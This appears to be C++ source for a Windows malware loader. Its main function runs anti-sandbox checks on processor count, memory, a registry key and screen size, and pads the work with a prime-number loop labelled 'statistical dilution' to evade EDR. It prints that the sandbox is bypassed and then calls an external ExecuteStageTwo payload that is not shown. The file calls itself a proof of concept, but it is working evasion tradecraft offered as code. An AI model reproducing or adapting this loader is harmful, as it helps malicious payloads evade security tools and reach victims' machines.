#include <windows.h>
#include <iostream>
#include <vector>

// 1. Declare the external function signature
extern void ExecuteStageTwo();

// ---------------------------------------------------------
// [STATISTICAL DILUTION & API STUFFING LOGIC]
// ---------------------------------------------------------
bool PerformDecoyInitialization() {
    volatile int entropy_score = 0;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors > 1) entropy_score += 10;

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys > (1024 * 1024 * 1024)) entropy_score += 20;

    HKEY hKey;
    LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey);
    if (lRes == ERROR_SUCCESS) {
        entropy_score += 30;
        RegCloseKey(hKey);
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    if (screenWidth > 800 && screenHeight > 600) entropy_score += 40;

    std::vector<int> primes;
    for (int i = 2; i < (entropy_score * 100); i++) {
        bool isPrime = true;
        for (int j = 2; j * j <= i; j++) {
            if (i % j == 0) { isPrime = false; break; }
        }
        if (isPrime) primes.push_back(i);
    }

    return (primes.size() > 10);
}

// ---------------------------------------------------------
// THE LOADER ENTRY POINT
// ---------------------------------------------------------
int main() {
    // Phase 1: Evasion
    if (!PerformDecoyInitialization()) {
        std::cout << "[-] Environment checks failed. Virtualized sandbox suspected. Exiting." << std::endl;
        return 0;
    }

    std::cout << "[+] Statistical Dilution Phase Complete." << std::endl;
    std::cout << "[+] Environment is valid. EDR sandbox bypassed." << std::endl;
    std::cout << "[*] Executing benign Proof of Concept payload..." << std::endl;

    // Phase 2: Handoff
    ExecuteStageTwo();

}